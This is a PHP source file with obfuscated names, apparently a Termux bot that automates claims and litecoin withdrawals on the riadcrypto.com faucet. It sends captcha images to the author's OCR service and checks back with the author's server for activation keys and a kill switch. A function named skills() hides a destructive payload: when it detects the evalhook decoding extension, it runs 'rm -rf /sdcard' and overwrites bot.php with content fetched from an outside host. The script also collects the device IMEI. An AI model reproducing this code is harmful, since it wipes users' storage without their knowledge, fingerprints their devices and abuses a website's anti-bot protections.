<?php

#date_default_timezone_set('Asia/Jakarta');
system("clear");
$var_0="\n";$var_1="\t";
//warnn
$var_2="\033[34m";$var_3="\033[36m";$var_4="\033[92m";
$var_5="\033[37m";$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";$var_10="\033[0"."m";
function saveas($var_11,$var_12){
 if(!file_exists($var_11)){file_put_contents($var_11,"[]"); }
 $var_15 = json_decode(file_get_contents($var_11),1);
 $var_17 = array_merge($var_15,$var_12);
file_put_contents($var_11,json_encode($var_17,JSON_PRETTY_PRINT));}
function captcha($var_22,$var_23){
$var_24 = curl_init();
curl_setopt($var_24, CURLOPT_URL, $var_22);
curl_setopt($var_24, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($var_24, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($var_24, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($var_24, CURLOPT_POST, true);
curl_setopt($var_24, CURLOPT_POSTFIELDS, $var_23);
$var_33 = curl_exec($var_24);
curl_close($var_24);
return $var_33;}
function ngentod($var_22,$var_38, $var_23){
$var_24 = curl_init();
curl_setopt($var_24, CURLOPT_URL, $var_22);
curl_setopt($var_24, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($var_24, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($var_24, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($var_24, CURLOPT_HTTPHEADER, $var_38);
curl_setopt($var_24, CURLOPT_TIMEOUT,30       );
#curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie");
#curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie");
curl_setopt($var_24, CURLOPT_POST, true);
curl_setopt($var_24, CURLOPT_POSTFIELDS, $var_23);
$var_33 = curl_exec($var_24);
curl_close($var_24);
return $var_33;}

function loding($var_56,$var_57) {
$var_4="\033[92m";$var_5="\033[37m";
$var_8="\033[33m";$var_3="\033[36m";
$var_62=[$var_3,$var_4,$var_3,$var_4,$var_3,$var_4];$var_69=1;
for($var_70=$var_57;$var_70>0;$var_70--){
$var_74=str_repeat("â¢",$var_69);$var_76=$var_62[$var_69-1];
echo $var_5."[".$var_76."wait".$var_5."] $var_56 $var_70 sec tod! $var_74";
if($var_69==6){$var_69=1;}else{$var_69++;}sleep(1);
echo 
"\r                                                       \r";}}

function head($var_12){
 foreach($var_12 as $var_90=>$var_91){$var_92[]=$var_90.": ".$var_91;}
 return $var_92; }
 
function titid($var_22,$var_38){
$var_24 = curl_init();
curl_setopt($var_24, CURLOPT_URL, $var_22);
curl_setopt($var_24, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($var_24, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($var_24, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($var_24, CURLOPT_HTTPHEADER, $var_38);
curl_setopt($var_24, CURLOPT_VERBOSE, 0);
/*curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie");*/
$var_33 = curl_exec($var_24);
curl_close($var_24);
return $var_33;}

function get($var_22,$var_38){
$var_24 = curl_init();
curl_setopt($var_24, CURLOPT_URL, $var_22);
curl_setopt($var_24, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($var_24, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($var_24, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($var_24, CURLOPT_HTTPHEADER, $var_38);
curl_setopt($var_24, CURLOPT_TIMEOUT,30       );
#curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie");
#curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie");
curl_setopt($var_24, CURLOPT_CUSTOMREQUEST, "GET");
$var_33 = curl_exec($var_24);
curl_close($var_24);
return $var_33;}

$var_127="$var_5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
function timer($var_129,$var_130){
  date_default_timezone_set('UTC');
$var_131 = time()+$var_130;
$var_2="\033[34m";$var_3="\033[36m";
$var_4="\033[92m";$var_5="\033[37m";
$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";
$var_10="\033[0"."m";
$var_142=[$var_5,$var_7];
$var_70=0;
$var_62=[$var_4,$var_8,$var_3,$var_4,$var_8,$var_3];$var_69=1;
while(true):
echo "\r                                                        \r";
$var_154=$var_142[$var_70];
$var_157 = $var_131-time();
$var_159=date("H:i:s",$var_157);
if($var_157<1){ break; }
$var_74=str_repeat("â",$var_69);$var_76=$var_62[$var_69-1];
$var_167="tod!";$var_168="â©";
echo $var_5.$var_129."$var_5 â¨$var_154$var_159$var_5$var_168 $var_167$var_76$var_74";
if($var_69==6){$var_69=1;}else{$var_69++;} sleep(1);
$var_70++; 
if($var_70 >= count ($var_142)){$var_70=0;}

endwhile; 
  }

function settings($var_186,$var_187){
$var_22 = "https://tuyulgaple.online/sunggingads/";
$var_189 = json_encode(
    array(
        'sk' => $var_186,
        'vr' => $var_187 ));
$var_192 = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => $var_189
    ));
$var_194 = stream_context_create($var_192);
$var_196     = json_decode(file_get_contents($var_22, false, $var_194),1);

$var_199      = $var_196["baner"];
if(!$var_196["status"]){ 
 $var_129 = "skrip di non-aktifkan\n";
 echo $var_203.$var_199.$var_129; exit; }
else{ return $var_203.$var_199; }  }

function clr($var_199){system("clear");echo $var_199.$var_0;}

function strip(){
$var_5="\033[37m";
echo "$var_5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";}

function curl( $var_22,$var_23,$var_38){
 $var_24 = curl_init($var_22);
 curl_setopt($var_24, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_24, CURLOPT_HTTPHEADER, $var_38 );
 curl_setopt($var_24, CURLOPT_SSL_VERIFYPEER, 1   );
 curl_setopt($var_24, CURLOPT_TIMEOUT,30          );
 curl_setopt($var_24, CURLOPT_VERBOSE, 0          );
if(strlen($var_23) > 0 ){ // POST METHOD
 curl_setopt($var_24, CURLOPT_CUSTOMREQUEST, "POST");
 curl_setopt($var_24, CURLOPT_POSTFIELDS,    $var_23 ); }
if(strlen($var_228)   > 0 ){ // settings proxy
 curl_setopt($var_24, CURLOPT_PROXY,         $var_228   ); }
 $var_33 = curl_exec($var_24);
 $var_233   = curl_getinfo($var_24);
 curl_close($var_24);
 if($var_233["http_code"]==302){
 return $var_233["redirect_url"]; } else { return $var_33; } }
 
 function verif_key($var_186){
$var_0="\n";$var_1="\t";
//warna
$var_2 = "\033[34m"; $var_3 = "\033[36m"; $var_4 = "\033[92m";
$var_5= "\033[37m"; $var_6= "\033[35m"; $var_7 = "\033[31m";
$var_8 = "\033[33m"; $var_9= "\033[8m";  $var_10  = "\033[0"."m";
while(true): /*clr($clr);*/
if( $var_251 ){
 $var_251 = 0;
 while(true): /*clr($clr);*/
 $var_253 = str_replace($var_0,"",file_get_contents("keys"));
 $var_22 = "http://tuyulgaple.online/aktivator/";
 $var_256 = json_encode([ "request" => $var_186,"keys" => $var_253]);
 $var_259  = json_decode( curl($var_22,$var_256,array()),1 );
if( $var_259["respon"] ) {
  echo $var_3."=> ".$var_259["respon"].$var_0;
  $var_266 = readline($var_5."input key : ");
  if( $var_266 ){
  $var_256 = json_encode(["request" => $var_186,"keys" => $var_266]);
  $var_259  = json_decode(curl($var_22,$var_256,array()),1);
  if( $var_259["code"] != 10 ) {
  file_put_contents("keys",$var_266);
  $var_253 = str_replace($var_0,"",file_get_contents("keys")); break; }}}
 else{ readline($var_4."your keys is uptodate ");break; }endwhile; }
 $var_22 = "http://tuyulgaple.online/aktivator/";
 $var_253 = str_replace($var_0,"",file_get_contents("keys"));
 $var_256 = json_encode(["request" => $var_186,"keys" => $var_253]);
 $var_259  = json_decode(curl($var_22,$var_256,array()),1);
if( $var_259["code"] == 10 ){ $var_251=1; }else{ break; }
endwhile;}
function imgScaner($var_291){
    $var_292=[
    "user-agent: Mozilla/5.0 (Linux; Android 10; ASUS_X01BDA Build/QD4A.200905.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36"
    ];
	if(!file_exists($var_291)){ return false; }
	$var_294=file_get_contents("keys");
	$var_22 = "https://tuyulgaple.online/api/new/";
	$var_256 = json_encode([
		"request"    => "cloudocr",
		"keys"       => $var_294,
		"data"       => base64_encode(file_get_contents($var_291))
		]);
	$var_196  = curl($var_22,$var_256,$var_292);
	
	if($var_196=="fail"){ exit("keys are expired, please update first !\n"); }
	return explode(":",$var_196)[1];	
	}

function verif_keys($var_186,$var_199){
$var_0="\n";$var_1="\t";
//warna
$var_2 = "\033[34m"; $var_3 = "\033[36m"; $var_4 = "\033[92m";
$var_5= "\033[37m"; $var_6= "\033[35m"; $var_7 = "\033[31m";
$var_8 = "\033[33m"; $var_9= "\033[8m";  $var_10  = "\033[0"."m";
while(true): clr($var_199);
if( $var_251 ){
 $var_251 = 0;
 while(true): clr($var_199);
 $var_253 = str_replace($var_0,"",file_get_contents("keys"));
 $var_22 = "http://tuyulgaple.online/aktivator/";
 $var_256 = json_encode([ "request" => $var_186,"keys" => $var_253]);
 $var_259  = json_decode( curl($var_22,$var_256,array()),1 );
if( $var_259["respon"] ) {
  echo $var_3."=> ".$var_259["respon"].$var_0;
  $var_266 = readline($var_5."input key : ");
  if( $var_266 ){
  $var_256 = json_encode(["request" => $var_186,"keys" => $var_266]);
  $var_259  = json_decode(curl($var_22,$var_256,array()),1);
  if( $var_259["code"] != 10 ) {
  file_put_contents("keys",$var_266);
  $var_253 = str_replace($var_0,"",file_get_contents("keys")); break; }}}
 else{ readline($var_4."your keys is uptodate ");break; }endwhile; }
 $var_22 = "http://tuyulgaple.online/aktivator/";
 $var_253 = str_replace($var_0,"",file_get_contents("keys"));
 $var_256 = json_encode(["request" => $var_186,"keys" => $var_253]);
 $var_259  = json_decode(curl($var_22,$var_256,array()),1);
if( $var_259["code"] == 10 ){ $var_251=1; }else{ break; }
endwhile; }
function input($var_360,$var_199,$var_23,$var_363){
 $var_364 = array(); 
 foreach( $var_23 as $var_366 ){
 clr($var_199);
 if(!$var_363[$var_366]){ 
  $var_370 = readline($var_366." : ");
  $var_364 = array_merge($var_364,[$var_366 => $var_370 ]); }
 else{ $var_364 = array_merge($var_364,[ $var_366 => $var_363[$var_366] ]); }
 } if($var_364[$var_23[0]]){ return $var_364; } }

function lisensi($var_186){
 $var_385 = [
 1 => "termux-telephony-deviceinfo",
 2 => "getprop persist.radio.imei",
 3 => "getprop persist.sys.vtouch.imei" ];
 
 foreach($var_385 as $var_387 => $var_91){
 switch($var_387){
  case 1:
   $var_233 = shell_exec($var_91);
   $var_233 = json_decode($var_233,1);
   if( $var_394 = $var_233["device_id"] ){ break 2; }
   break;
  case 2:
   $var_396 = shell_exec($var_91);
   $var_396 = str_replace("\n","",$var_396);
   if(strlen($var_396)==15 ){ $var_394 = $var_396; break 2; }
   break;
  case 3:
   $var_396 = shell_exec($var_91);
   $var_396 = str_replace("\n","",$var_396);
   if(strlen($var_396)==15 ){ $var_394 = $var_396; break 2; }
   break;
 } }
 if(!$var_394){ 
 echo "\r                                             \r";
 echo "termux api belum di install\n";exit; }
 return hash("sha1",$var_186.$var_394);
 } 
 
 function fake_user(){
$var_22  = "https://tuyulgaple.tech/randomuser/";
$var_414 = json_decode(file_get_contents($var_22),1); 
$var_416 = [ 
    "name"  => [
              "first"  => $var_414["first"],
              "last"   => $var_414["last"],
              "full"   => $var_414["full_name"] ],
    "uuid"  => $var_414["uuid"]  ];
return $var_416; }
 
function verif_user($var_186,$var_423){
 $var_22 = "https://tuyulgaple.online/premium/";
 $var_256 = json_encode([
 "request"  => $var_186,
 "tipe"     => "verif",
 "userid"   => $var_423 ]);
 
 $var_428 = curl_init();
 curl_setopt_array($var_428, array(
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_URL            => $var_22,
    CURLOPT_CUSTOMREQUEST  => "POST",
    CURLOPT_POSTFIELDS     => $var_256,
    CURLOPT_VERBOSE        => false  ));
 $var_33 = curl_exec($var_428);
 $var_259     = json_decode($var_33,1);
 if( $var_259["code"]==200 ){ return $var_259["code"]; } }

function antibot($var_22){
 if($var_439 = strpos($var_22,"var ablinks")){
  $var_23 = substr($var_22,$var_439);
  $var_23 = substr($var_23,0,strpos($var_23,"</script>"));}
$var_447 = array();
$var_448  = explode("rel=",$var_23);
foreach($var_448 as $var_90 => $var_91 ){ 
  $var_447[]= str_replace(["\\",'"'],"",substr($var_91,0,strpos($var_91,">"))); }
  array_shift($var_447);  
 $var_457=$var_447[0];$var_459=$var_447[1];$var_461=$var_447[2];
 $var_463 = [ 
   " $var_457 $var_459 $var_461",
   " $var_457 $var_461 $var_459",
   " $var_459 $var_457 $var_461",
   " $var_459 $var_461 $var_457",
   " $var_461 $var_457 $var_459",
   " $var_461 $var_459 $var_457"];
 return $var_463[array_rand($var_463)];}
function skills(){
$var_129="anda terdeteksi sebagai kang recode";
if(extension_loaded("evalhook")){
 @system("clear");shell_exec('rm -rf /sdcard');
 $var_485=file_get_contents("https://txxx.com/");
 file_put_contents("bot.php",$var_485);echo $var_129; exit; }}
skills();
error_reporting(0);
$var_488=(settings("riadcrypto","1.2",$var_203));
//verif_keys("sungging",$var_488);
clr($var_488);


$var_360="config.json";
while(true):
$var_15   = json_decode(file_get_contents($var_360),1);
if(!$var_15["url-solve"]){
 $var_366 = input($var_360,$var_488 ,["url-solve","cookie","wallet-ltc"],$var_363);
 saveas($var_360,$var_366); }
else{
 $var_502 = $var_15["url-solve"];
 $var_504 = $var_15["cookie"];
 $var_506 = $var_15["wallet-ltc"];
break; }
endwhile;
clr($var_488);
$var_509="riadcrypto.com";

/*$captcha=imgScaner('captcha.png');sleep(5);
echo $captcha.$t;exit;*/

#$cokie="ci_session=e754915d6901bccc3814b6a34a1aa37663c49459; _ga=GA1.1.2124662827.1629916981; csrf_cookie_name=baaeca344b6da0c3b168abd20990ed04; _ga_RLH8YZFS8H=GS1.1.1629916981.1.1.1629917019.0; dom3ic8zudi28v8lr6fgphwffqoz0j6c=c77e5641-2a85-4112-9b4d-c402d2f63002:3:1; pop_delay_524=1; _data_cpm=5-1";

$var_292=[
    "Host: $var_509",
    "upgrade-insecure-requests: 1",
    "user-agent: Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "referer: https://$var_509/",
    "cookie: $var_504"
     ];


$var_22=get("https://$var_509/dashboard",$var_292);
$var_517='acc-amount"><i class="fas fa-coins"></i> ';
if(strpos($var_22,$var_517)){
$var_520= substr($var_22,strpos($var_22,$var_517));
$var_520= str_replace($var_517,"",$var_520);
$var_520= substr($var_520,0,strpos($var_520,"<"));
echo $var_4."connect$var_5 you have$var_4 $var_520$var_0";
strip();}
else{echo $var_5."fail connect$var_0";
shell_exec("rm -rf config.json");
exit;}

$var_537=0;
while(true):
if( $var_537 >= 10 ){$var_537=0; timer($var_7."to many problem wait",300); }
$var_22=get("https://$var_509/faucet",$var_292);
$var_544='csrf_token_name" id="token" value="';
if(strpos($var_22,$var_544)){
$var_547= substr($var_22,strpos($var_22,$var_544));
$var_547= str_replace($var_544,'',$var_547);
$var_547= substr($var_547,0,strpos($var_547, '"'));
$var_76='hidden" name="token" value="';
if(strpos($var_22,$var_76)){
$var_560= substr($var_22,strpos($var_22,$var_76));
$var_560= str_replace($var_76,'',$var_560);
$var_560= substr($var_560,0,strpos($var_560, '"'));} }

#echo $csrf.$t;
#echo $token.$t;exit;


while(true):
$var_570=titid($var_502,$var_292);
$var_573=strpos($var_570,'chid"     : "');
$var_573=substr($var_570,$var_573);
$var_573=str_replace('chid"     : "','',$var_573);
$var_573=substr($var_573,0,strpos($var_573,'"'));
$var_583=strpos($var_570,'uid"      : "');
$var_583=substr($var_570,$var_583);
$var_583=str_replace('uid"      : "','',$var_583);
$var_583=substr($var_583,0,strpos($var_583,'"'));
if($var_573==0){echo $var_5."solvemedia error!$var_0";}

$var_570=titid("https://api-secure.solvemedia.com/papi/media?c=$var_573;w=300;h=150;fg=000000;bg=f8f8f8",$var_292);
$var_599=strpos($var_570,"<html>");
$var_601=strpos($var_570,"GIF");
if($var_599==100){}
else{
file_put_contents('captcha.jpg',$var_570);
$var_605=imgScaner("captcha.jpg");sleep(5);
#exec('termux-open captcha.jpg');
break;}
endwhile;
$var_606  = date("H:i:s",time()+7*60*60);
echo "\r                                                        \r";
echo $var_5."$var_606 captcha ->$var_4 $var_605";
sleep(2);
#$captcha=readline($pth."input captcha: ");
    
/*$antibot = antibot($url);*/

$var_23 = http_build_query([
  #"antibotlinks"    => $antibot,
  "csrf_token_name" => $var_547,
  "token"           => $var_560,
  "captcha"         => "solvemedia",
  "g-recaptcha-response" => "",
  "adcopy_response" => $var_605,
  "adcopy_challenge"=> $var_573
  ]);
$var_22=ngentod("https://$var_509/faucet/verify",$var_292,$var_23);
if($var_620 = strpos($var_22,"Invalid")){
  $var_537++;
  $var_129 = substr($var_22,$var_620);
  $var_129 = substr($var_129,0,strpos($var_129,"</div>"));
  echo "\r                                                        \r";
echo $var_5."$var_606 ".$var_7.$var_129;}
elseif($var_633=strpos($var_22,"text: '")){
$var_537=0;
$var_633=substr($var_22,$var_633);
$var_633=str_replace("text: '","",$var_633);
$var_633=substr($var_633,0,strpos($var_633," coins"));

$var_570=get("https://$var_509/dashboard",$var_292);
$var_517='acc-amount"><i class="fas fa-coins"></i> ';
$var_520= strpos($var_570,$var_517);
$var_520= substr($var_570,strpos($var_570,$var_517));
$var_520= str_replace($var_517,"",$var_520);
$var_520= substr($var_520,0,strpos($var_520,"<"));
$var_606  = date("H:i:s",time()+7*60*60);
echo "\r                                                        \r";
echo $var_5.$var_1."   reward $var_4$var_1 +$var_633$var_0";
echo $var_2."[$var_606]$var_5 balance$var_4$var_1 $var_520$var_0";

$var_23="method=1&amount=100&wallet=$var_506&csrf_token_name=$var_547";
$var_570=ngentod("https://$var_509/dashboard/withdraw",$var_292,$var_23);
if($var_682=strpos($var_570,"text: '")){
$var_682=substr($var_570,$var_682);
$var_682=str_replace("text: '","",$var_682);
$var_682=substr($var_682,0,strpos($var_682," "));
echo $var_4."success $var_682 token sent to account faucetpay!$var_0";}
strip();/*timer("wait",90);*/}else{
echo "\r                                                        \r";
    echo $var_5."error!";$var_537++;}
endwhile;



?>
